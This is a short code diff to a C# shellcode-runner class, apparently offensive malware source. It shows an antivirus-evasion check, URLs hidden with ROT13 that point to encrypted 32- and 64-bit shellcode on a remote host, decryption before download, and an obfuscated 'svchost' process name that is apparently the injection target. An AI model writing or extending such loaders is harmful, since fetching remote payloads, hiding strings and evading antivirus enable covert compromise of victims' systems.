@@ -160,8 +160,8 @@ public class ShellcodeRunner
         if (DetectAV())
             return;
 
-        byte[] shellcode32 = LoadShellcode("uggc://192.168.49.112/furyypbqr32.ova.rap");
-        byte[] shellcode64 = LoadShellcode("uggc://192.168.49.112/furyypbqr64.ova.rap");
+        byte[] shellcode32 = LoadShellcode(Decrypt("uggc://192.168.49.112/furyypbqr32.ova.rap"));
+        byte[] shellcode64 = LoadShellcode(Decrypt("uggc://192.168.49.112/furyypbqr64.ova.rap"));
 
         // svchost
         string processName = ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(Decrypt("p3MwnT9mqN==")));
